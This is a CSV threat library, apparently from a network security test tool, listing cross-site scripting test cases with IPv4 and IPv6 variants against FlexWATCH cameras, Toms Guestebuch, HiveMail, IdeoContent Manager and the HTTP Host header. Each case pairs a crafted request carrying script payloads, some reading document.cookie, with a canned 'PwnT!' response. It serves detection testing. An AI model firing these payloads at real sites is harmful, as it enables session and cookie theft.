XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,GET /%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1[[0D 0A ]]HOST: www.netcamera.com[[0D 0A ]]User-Agent: Elinks (0.11.1; Linux 2.2 i386;152x25)[[0D 0A ]]Referer:http://www.netcamera.com/main.html[[0D 0A ]]Accept: */*[[0D 0A ]]Accept-Encoding: gzip[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]
flexwatch_xss.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability,"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿flexwatch_xss_IPv6.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability (IPv6 Version),"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80 (IPv6 Version)",HTTP/IPv6,TCP,GET /%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1[[0D 0A ]]HOST: www.netcamera.com[[0D 0A ]]User-Agent: Elinks (0.11.1; Linux 2.2 i386;152x25)[[0D 0A ]]Referer:http://www.netcamera.com/main.html[[0D 0A ]]Accept: */*[[0D 0A ]]Accept-Encoding: gzip[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]
flexwatch_xss_IPv6.xml,FlexWATCH Network Camera Cross-Site Scripting Vulnerability (IPv6 Version),"This threat recreates a cross site scripting condition in FlexWATCH Network Camera. This can allow an attacker to steal session and cookie information.FlexWATCH Network Camera is a web application, and will typically listen on port 80 (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿fusebox_xss.xml,Fusebox Cross Site Scripting Attack,"This threat recreates a cross site scripting condition in ColdFusion Fusebox.  This can allow an attacker to steal session and cookie information.  Fusebox is a web application, and will typically listen on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿fusebox_xss_IPv6.xml,Fusebox Cross Site Scripting Attack (IPv6 Version),"This threat recreates a cross site scripting condition in ColdFusion Fusebox.  This can allow an attacker to steal session and cookie information.  Fusebox is a web application, and will typically listen on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"GET /form.php?action=show&homepage=[<script>alert(""pwnt"");</script>]&mail=[<script>alert(""pwnt"");</script>]&name=[<script>alert(""pwnt"");</script>]  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss_IPv6.xml,Toms Guestebuch 1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /form.php?action=show&homepage=[<script>alert(""pwnt"");</script>]&mail=[<script>alert(""pwnt"");</script>]&name=[<script>alert(""pwnt"");</script>]  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss_IPv6.xml,Toms Guestebuch 1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"GET /admin/header.php?language=[<script>alert(""pwnt"");</script>]&anzeigebreite=[<script>alert(""pwnt"");</script>]  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss_b.xml,Toms Guestebuch 1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss_b_IPv6.xml,Toms Guestebuch 1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /admin/header.php?language=[<script>alert(""pwnt"");</script>]&anzeigebreite=[<script>alert(""pwnt"");</script>]  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss_b_IPv6.xml,Toms Guestebuch 1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"GET install.php?msg=<script>alert(""pwnt"");</script>  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss_c.xml,Toms Guestebuch  1.00,This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿guestbook_xss_c_IPv6.xml,Toms Guestebuch  1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET install.php?msg=<script>alert(""pwnt"");</script>  HTTP 1.0[[0D 0A 0D 0A]]"
guestbook_xss_c_IPv6.xml,Toms Guestebuch  1.00 (IPv6 Version),This threat sends a crafted URL that contains Javascript to be included  in the returned page. Toms Guestebuch is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /index.php/%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E  HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_xss.xml,HiveMail XSS Vulnerability,This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_xss_IPv6.xml,HiveMail XSS Vulnerability (IPv6 Version),This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /index.php/%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E  HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_xss_IPv6.xml,HiveMail XSS Vulnerability (IPv6 Version),This threat is an example of a cross-site scripting attack where the code is injected via the HiveMail index.php. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,GET / HTTP/1.1[[0D 0A ]]Host: <script>alert('1mp3rf3ctr0x');</script>[[0D 0A 0D 0A]]
host_xss.xml,HTTP Host XSS,"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿host_xss_IPv6.xml,HTTP Host XSS (IPv6 Version),"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack. (IPv6 Version)",HTTP/IPv6,TCP,GET / HTTP/1.1[[0D 0A ]]Host: <script>alert('1mp3rf3ctr0x');</script>[[0D 0A 0D 0A]]
host_xss_IPv6.xml,HTTP Host XSS (IPv6 Version),"This threat sends a Javascript alert through the Host: field of an HTTP packet.  Some webservers will echo this input back out the web browser, creating the possibility of a cross-site scripting attack. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"GET /news_full.php?&page=2""><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20051020 Epiphany/1.8.2[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300..Connection: keep-alive..Cache-Control: max-age=0[[0D 0A 0D 0A]]"
ideocontent_xss.xml," IdeoContent Manager news_full.php page Variable XSS",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿ideocontent_xss_IPv6.xml," IdeoContent Manager news_full.php page Variable XSS (IPv6 Version)",This threat sends a crafted URL that contains Javascript which is included in the returned page. IdeoContent Manager is a web based interface that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /news_full.php?&page=2""><script>alert(document.cookie)</script> HTTP/1.0[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20051020 Epiphany/1.8.2[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300..Connection: keep-alive..Cache-Control: max-age=0[[0D 0A 0D 0A]]"
